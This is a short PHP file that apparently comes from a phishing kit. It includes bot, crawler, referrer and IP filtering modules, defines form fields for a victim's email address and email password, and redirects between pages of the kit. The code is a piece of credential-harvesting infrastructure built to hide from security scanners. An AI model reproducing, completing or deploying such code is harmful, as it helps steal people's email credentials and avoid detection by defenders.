<?php
session_start();
error_reporting(0);
include '../../autob/bt.php';
include '../../autob/basicbot.php';
include '../../autob/uacrawler.php';
include '../../autob/refspam.php';
include '../../autob/ipselect.php';
include "../../autob/bts2.php";
$idc="esubmit";
$proc="../vn";
$ename="email";
$pname="emailpass";
$epage="../em";
if(!isset($_SESSION['email'])){header('location:'.$epage);};
if(isset($_GET[$theerrkey]) || isset($_GET['sfailed'])){$eshow="?".$theerrkey."=On";};
?>